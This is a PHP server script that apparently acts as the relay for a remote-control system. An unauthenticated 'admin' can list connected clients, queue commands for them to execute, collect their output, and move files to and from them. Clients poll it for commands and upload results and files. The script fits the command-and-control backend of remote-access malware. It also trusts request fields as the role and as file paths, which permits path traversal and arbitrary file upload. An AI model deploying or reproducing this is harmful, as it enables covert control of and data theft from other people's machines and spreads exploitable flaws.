<?php
  //for admin respect
	require_once('define.php');
	require_once('functions.php');

	$role = $_POST[ROLE_TITLE];
	$type = $_POST[TYPE_TITLE];

	$result = array(
		'status' => 0,
		'msg' => ''
	);

	$username = isset($_POST['uname']) ? $_POST['uname'] : "";

  if($role == ADMIN_ROLE){
  	$result['status'] = checkUserLive($username) == true ? CONNECTED : DISCONNECTED;
		$resfile = RESULT_DIR.$username;
		
		if($type == CLIENTS){
			$result['msg'] =  getClientList();
		}

		if($type == EXECUTE) {
			saveData(COMMADN_DIR.$username, $_POST['content']);
			if(file_exists(RESULT_DIR.$username)) unlink(RESULT_DIR.$username);
		}

		if($type == POOLING && file_exists($resfile) == true) {
			$result['status'] = 3;
			$result['msg'] = loadData(RESULT_DIR.$username);
			$result['total'] = fileCntInDir(FILE_RECEIVE_DIR.$username);
			unlink(RESULT_DIR.$username);
		}

		if($type == UPLOAD){
			$uploaddir = FILE_SEND_DIR.$username.SLASH;
			if(!file_exists($uploaddir)) mkdir($uploaddir);
			move_uploaded_file($_FILES["file"]["tmp_name"], $uploaddir.$_POST['subpos']);
		}
		
		if($type == DOWNLOAD){
			$downfile = FILE_RECEIVE_DIR.$username.SLASH.$_POST['subpos'];
			if(file_exists($downfile)) {
				echo loadData($downfile);
				unlink($downfile);
			}
			exit;
		}

	}else if($role == USER_ROLE){
		if($username != "")
			fclose(fopen(RESIDENCE_DIR.$username, "w"));

		if($type == ASK_NAME) {
			$result['msg'] = getnerateValidUserId();
		}

		if($type == POOLING) {
			$result['msg'] = loadData(COMMADN_DIR.$username);
			$result['total'] = fileCntInDir(FILE_SEND_DIR.$username);
			//unlink(COMMADN_DIR.$username);
		}

		if($type == RESULT) {
			saveData(RESULT_DIR.$username, $_POST['content']);
			if(file_exists(COMMADN_DIR.$username)) unlink(COMMADN_DIR.$username);
		}

		if($type == DOWNLOAD) {
			$downfile = FILE_SEND_DIR.$username.SLASH.$_POST['subpos'];
			if(file_exists($downfile)) {
				echo loadData($downfile);
				unlink($downfile);
			}
			exit;
		}

		if($type == UPLOAD) {
			$uploaddir = FILE_RECEIVE_DIR.$username.SLASH;
			if(!file_exists($uploaddir)) mkdir($uploaddir);
			move_uploaded_file($_FILES["file"]["tmp_name"], $uploaddir.$_POST['subpos']);
		}
	}
	
	echo json_encode($result);
	ob_flush();ob_clean();
?>